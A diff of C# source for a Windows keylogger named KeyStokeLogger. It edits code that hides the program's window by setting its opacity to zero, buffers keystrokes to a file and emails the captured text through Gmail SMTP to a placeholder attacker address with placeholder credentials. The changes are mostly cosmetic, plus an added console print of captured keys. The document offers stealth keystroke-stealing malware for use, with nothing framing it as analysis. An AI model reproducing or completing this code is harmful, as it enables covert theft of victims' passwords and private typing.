@@ -1,9 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Linq;
 using System.Text;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
@@ -33,10 +28,12 @@ namespace KeyStokeLogger
         {
             try
             {
-                StreamWriter sw = new StreamWriter(file, true);
-                
+
+                StreamWriter sw = new StreamWriter(file, true);                
                 sw.Write(keyBuffer.ToString());
+                Console.WriteLine("keys-> "+keyBuffer);
                 sw.Write(data.ToString());
+
                 sw.Close();
                 keyBuffer.Clear();
             }
@@ -297,7 +294,7 @@ namespace KeyStokeLogger
         int ctrl, shift, del,back = 0; int sp; string msg2; char a,ab;
         private void Form1_Load(object sender, EventArgs e)
         {
-            this.Opacity = 0;  //Make this Transparen to hide the UI
+            this.Opacity = 0;  //Make this Transparent to hide the UI
             key.Enabled = true;
             log.Enabled = true;
             //notifyIcon1.ShowBalloonTip(5000);
@@ -309,7 +306,7 @@ namespace KeyStokeLogger
             keyBuffer = new StringBuilder();
             smtpClient= "smtp.gmail.com";
             smtpPort = "587";
-            mailfrom= "MAIL@gmail.com"; //ONLY GMAIL ALLOWED
+            mailfrom= "YOUR MAIL @ gmail.com"; //Only Gmail is Working as of this version.
 
         }
 
@@ -321,12 +318,12 @@ namespace KeyStokeLogger
             {
                 MailMessage mail = new MailMessage();
                 mail.From = new MailAddress(mailfrom);
-                mail.To.Add(new MailAddress("MAIL@gmail.com"));
+                mail.To.Add(new MailAddress("YOUR MAIL @ gmail.com"));
                 mail.Body = richTextBox1.Text;
 
                 SmtpClient Smtp_Client = new SmtpClient("smtp.gmail.com", 587);
                 Smtp_Client.EnableSsl = true;
-                Smtp_Client.Credentials = new NetworkCredential(mailfrom, "YOUR-EMAIL-1-PASSWORD"); ;
+                Smtp_Client.Credentials = new NetworkCredential(mailfrom, "YOUR EMAIL PASSWORD"); ;
 
                 Smtp_Client.SendCompleted += new SendCompletedEventHandler(smtp_SendCompleted);
                 Smtp_Client.SendAsync(mail, null);
@@ -349,7 +346,7 @@ namespace KeyStokeLogger
             try
             {
                 SmtpClient client = new SmtpClient(smtpClient);
-                MailMessage message = new MailMessage(mailfrom, "YOUR EMAIL @gmail.com");
+                MailMessage message = new MailMessage(mailfrom, "YOUR EMAIL @ gmail.com");
                 message.Body = richTextBox1.Text;
                 message.Subject = "KeyStrokeLogger";
                 client.Credentials = new System.Net.NetworkCredential(mailfrom, "YOUR EMAIL PASSWORD");
